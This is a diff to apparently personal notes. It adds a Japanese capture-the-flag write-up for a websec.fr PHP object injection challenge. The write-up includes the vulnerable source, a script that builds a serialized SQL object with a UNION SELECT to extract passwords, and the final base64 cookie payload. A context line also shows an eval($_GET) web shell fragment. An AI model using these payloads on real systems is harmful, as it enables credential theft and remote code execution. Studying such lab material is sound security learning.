@@ -431,6 +431,118 @@ $a=eval($_GET[c]);//[''] = '';
 
 // Last edited by admin (172.16.175.1)2018-09-08 20:35:19
 ```
+# writeup
+## \_\_destruct / SQL Injection (websec level04)
+http://websec.fr/  
+- **entrypoint**  
+User idの`1`を入力するとUsernameの値として`flag`という文字列が表示された。  
+`source1.php`,`source2.php`が見れた。  
+![image](https://user-images.githubusercontent.com/56021519/104459170-beb4d980-55ef-11eb-9785-5cc21365c4b8.png)  
+**source1.php**  
+どうみても入力を`unserialize`している箇所が脆弱。  
+```php
+<?php
+include 'connect.php';
+
+$sql = new SQL();
+$sql->connect();
+$sql->query = 'SELECT username FROM users WHERE id=';
+
+
+if (isset ($_COOKIE['leet_hax0r'])) {
+    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
+    try {
+        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
+            die('CANT HACK US!!!');
+        }
+    } catch(Exception $e) {
+        echo $e;
+    }
+} else {
+    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
+    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
+}
+
+if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
+    try {
+        $sql->query .= $_REQUEST['id'];
+    } catch(Exception $e) {
+        echo ' Invalid query';
+    }
+}
+?>
+```
+**source2.php**  
+以下のSQLクラスを利用してPHP Object Injectionするっぽい。`__construct()`は空っぽなので、`__destruct()`が使えそう。  
+デストラクタの中で`execute()`メソッドで`$this->conn->query ($this->query);`のようにして`query`の中のSQL文を実行している。  
+したがってここに任意のSQL文をセットした状態でserializeしてからunserializeすればSQL Injectionできそう！  
+```php
+<?php
+
+class SQL {
+    public $query = '';
+    public $conn;
+    public function __construct() {
+    }
+    
+    public function connect() {
+        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
+    }
+
+    public function SQL_query($query) {
+        $this->query = $query;
+    }
+
+    public function execute() {
+        return $this->conn->query ($this->query);
+    }
+
+    public function __destruct() {
+        if (!isset ($this->conn)) {
+            $this->connect ();
+        }
+        
+        $ret = $this->execute ();
+        if (false !== $ret) {    
+            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
+                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
+            }
+        }
+    }
+}
+?>
+```
+`$row[username]`として`username`カラムの値を要素とした連想配列の値を出力するので、単純に`select password from users`とすると、`$row[username]`で表示できないので、`union select`で結合する。  
+```php
+$inject = "or";
+class SQL {
+    public $query = 'SELECT username FROM users WHERE id=-1 union select password from users users2 where id=1';
+}
+
+$ex1 = new SQL();
+echo serialize($ex1)."\n";
+echo base64_encode(serialize($ex1))."\n";
+
+// 出力
+// O:3:"SQL":1:{s:5:"query";s:89:"SELECT username FROM users WHERE id=-1 union select password from users users2 where id=1";}
+// TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODk6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPS0xIHVuaW9uIHNlbGVjdCBwYXNzd29yZCBmcm9tIHVzZXJzIHVzZXJzMiB3aGVyZSBpZD0xIjt9 
+```
+これを`$_COOKIE['leet_hax0r']`にセットすると以下のようにFlagをゲット！  
+![image](https://user-images.githubusercontent.com/56021519/104460136-08ea8a80-55f1-11eb-8b2d-0901870afec1.png)　　
+- **payload**  
+```txt
+Cookie: leet_hax0r=TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODk6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPS0xIHVuaW9uIHNlbGVjdCBwYXNzd29yZCBmcm9tIHVzZXJzIHVzZXJzMiB3aGVyZSBpZD0xIjt9=
+```
+##
+- **entrypoint**  
+- **payload**  
+##
+- **entrypoint**  
+- **payload**  
+##
+- **entrypoint**  
+- **payload**  
+
 # 参考
 https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
 基本的な説明。わかりやすい。   
